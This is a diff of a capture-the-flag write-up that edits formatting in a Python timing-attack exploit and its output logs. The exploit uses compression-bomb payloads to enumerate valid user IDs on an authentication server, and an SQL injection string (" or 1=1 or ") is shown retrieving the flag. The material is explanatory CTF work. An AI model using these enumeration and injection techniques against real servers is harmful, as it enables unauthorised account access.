@@ -70,14 +70,14 @@ Let’s take a look at the client.
     s.sendall(self.token_packet(self.uid,self.pwd))
     data = s.recv(1024)
     self.nonce = data
-    print("Got new challenge. Len : %s" % len(self.nonce))
+    print("Got new challenge. Len: %s" % len(self.nonce))
     s.close()
 
   def auth(self):
     print("[~] Sending with new challenge...")
     s = self.make_socket()
     s.sendall(self.auth_packet(self.uid,self.pwd,self.nonce))
-    print("Server response : %s" % s.recv(1024))
+    print("Server response: %s" % s.recv(1024))
     s.close()
 
 if __name__ == "__main__":
@@ -94,7 +94,7 @@ if __name__ == "__main__":
 
 After trying the client with username `1`, the server sent me a token. The same thing happened for username `2`. It seems that even if the username is invalid, the server always sends a token. So we can’t guess if the username is valid or not based on the token…
 
-The server had a problem with **load balancing**: after our first `get_challenge` request, the `auth_packet` was redirected to another server. That wasn’t a problem for exploiting, we just had to sent the `auth_packet` five times until we hit the good server (round-robin and 5 servers).
+The server had a problem with **load balancing**: after our first `get_challenge` request, the `auth_packet` was redirected to another server. That wasn’t a problem for exploiting, we just had to sent the `auth_packet` five times until we hit the right server (round-robin and 5 servers).
 
 Let’s take a look at the `process()` function…
 
@@ -151,14 +151,14 @@ class TimingAttack:
     start = default_timer()
     self.payload = compress('0'*40000000)
     stop = default_timer()
-    print("[+] Bomb generated - Took : %f to compress." % (stop - start))
+    print("[+] Bomb generated - Took: %f to compress." % (stop - start))
     time.sleep(1)
     # We try to decompress the payload, which will be used as a trigger
     start = default_timer()
     decompress(self.payload)
     stop = default_timer()
     self.bombtimer = (stop - start)/2 # You have to adjust this offset if you have a lot of false positives
-    print("[+] Bomb test - Time offset set : %f." % self.bombtimer)
+    print("[+] Bomb test - Time offset set: %f." % self.bombtimer)
 
   def create_socket(self):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -172,7 +172,7 @@ class TimingAttack:
     for x in range(0,50):
       took = self.send_exploit(x)
       timers.append(took)
-    print("[~] Average response time : %f" % mean(timers))
+    print("[~] Average response time: %f" % mean(timers))
     # When a response is higher than the trigger, this may be caused by a decompression.
     self.trigger = mean(timers)+self.bombtimer
 
@@ -183,10 +183,10 @@ class TimingAttack:
     for userid in range(1,max_uids+1):
       current = (float(userid)/max_uids)*100
       timer = self.send_exploit(userid)
-      print('[~] Uid : %d took : %f (%d%% completed)' % (userid,timer,current))
+      print('[~] Uid: %d took: %f (%d%% completed)' % (userid,timer,current))
       if timer >= self.trigger:
         stop = default_timer()
-        print("[+] Possible valid UID : %d found in %d seconds." % (userid,(stop-start)))
+        print("[+] Possible valid UID: %d found in %d seconds." % (userid,(stop-start)))
         # We check if the userid is a false positive.
         self.confirm(userid)
     print("[+] Timing attack done.")
@@ -206,16 +206,16 @@ class TimingAttack:
     success = 0
     for attempt in range(0,20):
       took = self.send_exploit(uid)
-      print("[~] Test n°%d : %f" % (attempt,took))
+      print("[~] Test n°%d: %f" % (attempt,took))
       if (took >= self.trigger):
-        print("[+] BANGARANG !")
+        print("[+] BANGARANG!")
         success += 1
       else:
-        print("[-] Nooooooo !")
+        print("[-] Nooooooo!")
     success_rate = float(success)/20*100
-    print("[~] Test results : %d seems to be %f%% valid." % (uid,success_rate))
+    print("[~] Test results: %d seems to be %f%% valid." % (uid,success_rate))
     if success_rate >= 50:
-      print("[+] User ID : %d doesn't seem to be a false positive." % uid)
+      print("[+] User ID: %d doesn't seem to be a false positive." % uid)
       while True:
         password = raw_input("Enter password (cancel with 'quit')\nNightlysploit $> ")
         if password == "quit": break
@@ -234,10 +234,10 @@ class TimingAttack:
       sock = self.create_socket()
       sock.sendall("%s\x02\x01\x02\x01%s\x02\x01\x02\x01%s\x02\x01\x02\x01%s\x02\x01\x02\x01\x45\x4f\x53" % (2, uid, password, challenge))
       response = sock.recv(1024)
-      if (response == "You were kicked by the NightlyAUTH Server. Reason : Authentification failed.\n"):
+      if (response == "You were kicked by the NightlyAUTH Server. Reason: Authentification failed.\n"):
         print("[~] Auth failed...")
       else:
-        print("[+] Server answered : %s" % response)
+        print("[+] Server answered: %s" % response)
 
   def chunks(self, l, n):
     return [l[i:i+n] for i in range(0, len(l), n)]
@@ -263,56 +263,57 @@ if __name__ == "__main__":
 After **8 minutes** on a cheap VPS server, we get the following result:
 
 ```
-[~] Uid : 3240 took : 0.068480 (32% completed)
-[~] Uid : 3241 took : 0.069281 (32% completed)
-[~] Uid : 3242 took : 0.069874 (32% completed)
-[~] Uid : 3243 took : 0.224517 (32% completed)
-[+] Possible valid UID : 3243 found in 484 seconds.
-[~] Test n°0 : 0.215680
-[+] BANGARANG !
-[~] Test n°1 : 0.217219
-[+] BANGARANG !
-[~] Test n°2 : 0.208675
-[+] BANGARANG !
-[~] Test n°3 : 0.199905
-[+] BANGARANG !
-[~] Test n°4 : 0.229774
-[+] BANGARANG !
-[~] Test n°5 : 0.208620
-[+] BANGARANG !
-[~] Test n°6 : 0.193230
-[+] BANGARANG !
-[~] Test n°7 : 0.204750
-[+] BANGARANG !
-[~] Test n°8 : 0.215756
-[+] BANGARANG !
-[~] Test n°9 : 0.211181
-[+] BANGARANG !
-[~] Test n°10 : 0.196094
-[+] BANGARANG !
-[~] Test n°11 : 0.213732
-[+] BANGARANG !
-[~] Test n°12 : 0.197914
-[+] BANGARANG !
-[~] Test n°13 : 0.195056
-[+] BANGARANG !
-[~] Test n°14 : 0.210873
-[+] BANGARANG !
-[~] Test n°15 : 0.201116
-[+] BANGARANG !
-[~] Test n°16 : 0.218596
-[+] BANGARANG !
-[~] Test n°17 : 0.216802
-[+] BANGARANG !
-[~] Test n°18 : 0.215007
-[+] BANGARANG !
-[~] Test n°19 : 0.222972
-[+] BANGARANG !
-[~] Test results : 3243 seems to be 100.000000% valid.
-[+] User ID : 3243 don't seems to be a false positive.
+[~] Uid: 3240 took: 0.068480 (32% completed)
+[~] Uid: 3241 took: 0.069281 (32% completed)
+[~] Uid: 3242 took: 0.069874 (32% completed)
+[~] Uid: 3243 took: 0.224517 (32% completed)
+[+] Possible valid UID: 3243 found in 484 seconds.
+[~] Test n°0: 0.215680
+[+] BANGARANG!
+[~] Test n°1: 0.217219
+[+] BANGARANG!
+[~] Test n°2: 0.208675
+[+] BANGARANG!
+[~] Test n°3: 0.199905
+[+] BANGARANG!
+[~] Test n°4: 0.229774
+[+] BANGARANG!
+[~] Test n°5: 0.208620
+[+] BANGARANG!
+[~] Test n°6: 0.193230
+[+] BANGARANG!
+[~] Test n°7: 0.204750
+[+] BANGARANG!
+[~] Test n°8: 0.215756
+[+] BANGARANG!
+[~] Test n°9: 0.211181
+[+] BANGARANG!
+[~] Test n°10: 0.196094
+[+] BANGARANG!
+[~] Test n°11: 0.213732
+[+] BANGARANG!
+[~] Test n°12: 0.197914
+[+] BANGARANG!
+[~] Test n°13: 0.195056
+[+] BANGARANG!
+[~] Test n°14: 0.210873
+[+] BANGARANG!
+[~] Test n°15: 0.201116
+[+] BANGARANG!
+[~] Test n°16: 0.218596
+[+] BANGARANG!
+[~] Test n°17: 0.216802
+[+] BANGARANG!
+[~] Test n°18: 0.215007
+[+] BANGARANG!
+[~] Test n°19: 0.222972
+[+] BANGARANG!
+[~] Test results: 3243 seems to be 100.000000% valid.
+[+] User ID: 3243 doesn't seem to be a false positive.
 Enter password (cancel with 'quit')
 Nightlysploit $>
 ```
+
 We can see a **big** difference between a bad user ID and a good user ID. (+0.15 seconds) If the network is *unstable*, we just have to raise the number of zeroes to compress.
 
 Ok, we have a good user id, but we don’t have a password. Let’s see if we can enter a random password…
@@ -340,6 +341,7 @@ Nightlysploit $> "'��u("'�f"�ht"
 [~] Auth failed...
 [+] Server answered :
 ```
+
 Something happened! Maybe it’s the quotes… After trying a single quote, it seems that a double quote is making the server behave strangely. Could this be SQL injection?
 
 ```
@@ -363,7 +365,7 @@ Nightlysploit $> " or 1=1 or "
 [~] Auth failed...
 [~] Auth failed...
 [~] Auth failed...
-[+] Server answered : The flag is : D34RG0DILUVC00KIEZ
+[+] Server answered: The flag is: D34RG0DILUVC00KIEZ
 ```
 
 Boom. The flag is `D34RG0DILUVC00KIEZ`.
